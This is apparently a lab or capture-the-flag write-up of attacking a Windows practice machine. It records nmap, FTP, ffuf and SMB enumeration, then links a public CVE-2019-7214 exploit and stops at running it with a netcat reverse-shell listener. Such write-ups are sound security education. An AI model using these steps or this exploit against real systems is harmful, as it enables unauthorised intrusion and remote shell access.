<h2>Recon</h2>

<h3>PortScan</h3>

>command:sudo nmap -A -p- -T4 -v 

```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-01 18:08 WAT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 18:08
Completed NSE at 18:08, 0.00s elapsed
Initiating NSE at 18:08
Completed NSE at 18:08, 0.00s elapsed
Initiating NSE at 18:08
Completed NSE at 18:08, 0.00s elapsed
Initiating Ping Scan at 18:08
Scanning 192.168.91.65 [4 ports]
Completed Ping Scan at 18:08, 0.21s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 18:08
Completed Parallel DNS resolution of 1 host. at 18:08, 0.03s elapsed
Initiating SYN Stealth Scan at 18:08
Scanning 192.168.91.65 [65535 ports]
Discovered open port 139/tcp on 192.168.91.65
Discovered open port 135/tcp on 192.168.91.65
Discovered open port 445/tcp on 192.168.91.65
Discovered open port 21/tcp on 192.168.91.65
Discovered open port 80/tcp on 192.168.91.65
Increasing send delay for 192.168.91.65 from 0 to 5 due to 545 out of 1362 dropped probes since last increase.
Increasing send delay for 192.168.91.65 from 5 to 10 due to 33 out of 81 dropped probes since last increase.
SYN Stealth Scan Timing: About 5.07% done; ETC: 18:18 (0:09:40 remaining)
Discovered open port 49667/tcp on 192.168.91.65
SYN Stealth Scan Timing: About 7.95% done; ETC: 18:21 (0:11:47 remaining)
SYN Stealth Scan Timing: About 12.01% done; ETC: 18:20 (0:11:07 remaining)
SYN Stealth Scan Timing: About 16.48% done; ETC: 18:20 (0:10:29 remaining)
SYN Stealth Scan Timing: About 22.24% done; ETC: 18:20 (0:09:51 remaining)
SYN Stealth Scan Timing: About 27.97% done; ETC: 18:20 (0:09:11 remaining)
SYN Stealth Scan Timing: About 33.64% done; ETC: 18:21 (0:08:31 remaining)
Discovered open port 49665/tcp on 192.168.91.65
SYN Stealth Scan Timing: About 38.96% done; ETC: 18:21 (0:07:52 remaining)
Discovered open port 5040/tcp on 192.168.91.65
SYN Stealth Scan Timing: About 43.97% done; ETC: 18:21 (0:07:13 remaining)
SYN Stealth Scan Timing: About 49.63% done; ETC: 18:21 (0:06:34 remaining)
SYN Stealth Scan Timing: About 61.36% done; ETC: 18:23 (0:05:54 remaining)
Discovered open port 49668/tcp on 192.168.91.65
SYN Stealth Scan Timing: About 66.37% done; ETC: 18:23 (0:05:05 remaining)
SYN Stealth Scan Timing: About 71.20% done; ETC: 18:23 (0:04:19 remaining)
Discovered open port 49664/tcp on 192.168.91.65
SYN Stealth Scan Timing: About 76.18% done; ETC: 18:23 (0:03:32 remaining)
Discovered open port 49669/tcp on 192.168.91.65
SYN Stealth Scan Timing: About 81.17% done; ETC: 18:23 (0:02:47 remaining)
Discovered open port 49666/tcp on 192.168.91.65
SYN Stealth Scan Timing: About 86.12% done; ETC: 18:22 (0:02:02 remaining)
Discovered open port 17001/tcp on 192.168.91.65
SYN Stealth Scan Timing: About 91.37% done; ETC: 18:22 (0:01:16 remaining)
Discovered open port 9998/tcp on 192.168.91.65
Completed SYN Stealth Scan at 18:23, 889.31s elapsed (65535 total ports)
Initiating Service scan at 18:23
Scanning 14 services on 192.168.91.65
Service scan Timing: About 57.14% done; ETC: 18:24 (0:00:43 remaining)
Completed Service scan at 18:25, 163.57s elapsed (14 services on 1 host)
Initiating OS detection (try #1) against 192.168.91.65
Retrying OS detection (try #2) against 192.168.91.65
Retrying OS detection (try #3) against 192.168.91.65
Retrying OS detection (try #4) against 192.168.91.65
Retrying OS detection (try #5) against 192.168.91.65
Initiating Traceroute at 18:26
Completed Traceroute at 18:26, 0.29s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 18:26
Completed Parallel DNS resolution of 2 hosts. at 18:26, 0.04s elapsed
NSE: Script scanning 192.168.91.65.
Initiating NSE at 18:26
NSE: [ftp-bounce] PORT response: 501 Server cannot accept argument.
Completed NSE at 18:26, 16.10s elapsed
Initiating NSE at 18:26
Completed NSE at 18:26, 1.24s elapsed
Initiating NSE at 18:26
Completed NSE at 18:26, 0.00s elapsed
Nmap scan report for 192.168.91.65
Host is up (0.17s latency).
Not shown: 65521 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 04-29-20  09:31PM       <DIR>          ImapRetrieval
| 03-01-23  09:05AM       <DIR>          Logs
| 04-29-20  09:31PM       <DIR>          PopRetrieval
|_04-29-20  09:32PM       <DIR>          Spool
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
9998/tcp  open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| uptime-agent-info: HTTP/1.1 400 Bad Request\x0D
| Content-Type: text/html; charset=us-ascii\x0D
| Server: Microsoft-HTTPAPI/2.0\x0D
| Date: Wed, 01 Mar 2023 17:26:02 GMT\x0D
| Connection: close\x0D
| Content-Length: 326\x0D
| \x0D
| <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN""http://www.w3.org/TR/html4/strict.dtd">\x0D
| <HTML><HEAD><TITLE>Bad Request</TITLE>\x0D
| <META HTTP-EQUIV="Content-Type" Content="text/html; charset=us-ascii"></HEAD>\x0D
| <BODY><h2>Bad Request - Invalid Verb</h2>\x0D
| <hr><p>HTTP Error 400. The request verb is invalid.</p>\x0D
|_</BODY></HTML>\x0D
|_http-favicon: Unknown favicon MD5: 9D7294CAAB5C2DF4CD916F53653714D5
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-title: Site doesn't have a title (text/html; charset=utf-8).
|_Requested resource was /interface/root
17001/tcp open  remoting      MS .NET Remoting services
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=3/1%OT=21%CT=1%CU=30291%PV=Y%DS=2%DC=T%G=Y%TM=63FF8ABC
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=105%TI=I%II=I%SS=S%TS=U)OPS(
OS:O1=M54ENW8NNS%O2=M54ENW8NNS%O3=M54ENW8%O4=M54ENW8NNS%O5=M54ENW8NNS%O6=M5
OS:4ENNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T
OS:=80%W=FFFF%O=M54ENW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T
OS:2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=N
OS:)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
OS:IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-03-01T17:26:07
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required

TRACEROUTE (using port 110/tcp)
HOP RTT       ADDRESS
1   290.48 ms 192.168.49.1
2   290.48 ms 192.168.91.65

NSE: Script Post-scanning.
Initiating NSE at 18:26
Completed NSE at 18:26, 0.00s elapsed
Initiating NSE at 18:26
Completed NSE at 18:26, 0.00s elapsed
Initiating NSE at 18:26
Completed NSE at 18:26, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1088.92 seconds
           Raw packets sent: 75826 (3.341MB) | Rcvd: 68658 (2.750MB)

```
We have quite a number of ports opened here, but our focus will be on the major ports. So, our enumeration will be focused on port 21, port 80, port 139, port 9998 and port 17001


<h2>Enumeration Port 21</h2>

since anonymous login is allowed for this port this means we can login using default creds

```username:anonymous```      ```password:anonymous```

>command:ftp 192.168.91.65

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/algernon]
└─$ ftp 192.168.91.65                                                                                                
Connected to 192.168.91.65.
220 Microsoft FTP Service
Name (192.168.91.65:bl4ck4non): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls -la
229 Entering Extended Passive Mode (|||49875|)
125 Data connection already open; Transfer starting.
04-29-20  09:31PM       <DIR>          ImapRetrieval
03-01-23  09:05AM       <DIR>          Logs
04-29-20  09:31PM       <DIR>          PopRetrieval
04-29-20  09:32PM       <DIR>          Spool
226 Transfer complete.
ftp> 
```
Now, we got access to the ftp server. After looking around for a while, I couldn't find anything. On to the next port


<h2>Enumeration Port 80</h2>

Going to the webpage I got this

![image](https://user-images.githubusercontent.com/67879936/222224527-219e9383-bc31-4d4b-b387-25d6af64c370.png)

Alright so this is just the official Microsoft IIS site. Lets go ahead and fire up our directory searching tool

>command:ffuf -u "http://192.168.81.65/FUZZ" -w /usr/share/wordlists/dirb/common.txt -e .zip,.sql,.php,.phtml,.bak,.backup

```
┌──(bl4ck4non㉿bl4ck4non)-[~]
└─$ ffuf -u "http://192.168.81.65/FUZZ" -w /usr/share/wordlists/dirb/common.txt -e .zip,.sql,.php,.phtml,.bak,.backup

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.81.65/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .zip .sql .php .phtml .bak .backup 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 696, Words: 26, Lines: 32, Duration: 2167ms]
aspnet_client           [Status: 301, Size: 158, Words: 9, Lines: 2, Duration: 524ms]
:: Progress: [32298/32298] :: Job [1/1] :: 160 req/sec :: Duration: [0:06:33] :: Errors: 1 ::
```
Alright, we found just one directory. Trust me there's nothing in that directory lool. Moving on to the next port


<h2>Exploitation Port 139&445</h3>

First, lets check the available shares on this smb server

>command:smbclient -L 192.168.81.65

```
┌──(bl4ck4non㉿bl4ck4non)-[~]
└─$ smbclient -L 192.168.81.65                         
Password for [WORKGROUP\bl4ck4non]:
session setup failed: NT_STATUS_ACCESS_DENIED
```
We got the "Access Denied" error, this is probably because we don't have a username and a password

Lets try to use nmap scripting engine to check if it has an exploit

>command:nmap -p 139,445 --script smb-vuln*.nse 192.168.81.65

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/algernon]
└─$ nmap -p 139,445 --script smb-vuln*.nse 192.168.81.65 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-01 19:34 WAT
Nmap scan report for 192.168.81.65
Host is up (0.33s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR

Nmap done: 1 IP address (1 host up) scanned in 16.70 seconds
```
oops, we got nothing. Moving on to the next port


<h2>Enumeration Port 9998</h2>

Going to this webpage should get you this

![image](https://user-images.githubusercontent.com/67879936/222234659-998ecb6d-b9a8-4c41-853d-a8120016f42e.png)

Now, during our enumeration so far we haven't find user credentials. I also tried default creds for this login page and it didn't work.

But I went ahead and checked up exploits online and I found this

![image](https://user-images.githubusercontent.com/67879936/222246298-157fcd73-61e5-4225-82ad-4ca723ece097.png)

cool, we found an exploit. Lets go ahead and exploit this vulnerability



<h2>Exploitation</h2>

>Link to Exploit:https://github.com/devzspy/CVE-2019-7214

Download this on your machine, navigate to the directory and open the .py file in any text editor of your choice

![image](https://user-images.githubusercontent.com/67879936/222247234-bb4477ba-52bb-4028-b3ae-42821087d279.png)

What you need to change here is the LHOST,LPORT,HOST. LPORT will be the port you want your netcat to listen on, LHOST will be your machine's IP address while HOST will be the IP of the target machine

Now that you've changed all that, go ahead and save it.

We are going to need 2 terminals as usual, the first will be for running the exploit while the second will be for setting our netcat listener

>command terminal 1:python cve-2019-7214.py

>command terminal 2:rlwrap nc -nvlp 80



































